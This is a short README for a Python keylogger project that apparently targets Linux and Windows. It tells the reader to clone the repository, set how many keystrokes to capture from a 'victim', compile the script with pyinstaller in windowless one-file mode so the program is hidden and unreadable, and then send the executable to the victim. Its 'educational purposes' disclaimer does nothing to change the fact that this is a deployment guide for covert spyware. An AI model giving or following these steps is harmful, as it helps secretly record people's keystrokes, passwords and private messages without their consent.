# keylogger
Basic keylogger for Linux and Windows

# Disclaimer
```
Do not use this for black hat purposes
this created just for educational purposes
```
# how-to-install
Clone the repository
```git clone https://github.com/Cli3nt-ctrl/keylogger/```
Change the directory
```
cd keylogger
```
Install the reuired python libraries
```
pip3 install requirements.txt
```

# how-to-use
open keylogger.py and enter the number of letters you wanna capture through victim
```Enter the numbers here in the if loop :-- if len(a)==10 (default value is set as 10)
```
Using the pyinstaller is optioanl. Pyinstaller creates your python file into executable format (.exe in  Windows and .elf in Linux) which also makes your python file unreadable
```
pyinstaller keylogger.py --no-console --onefile 
```
Your executable file will be in dist folder
```
cd dist
```
Send this file to your victim
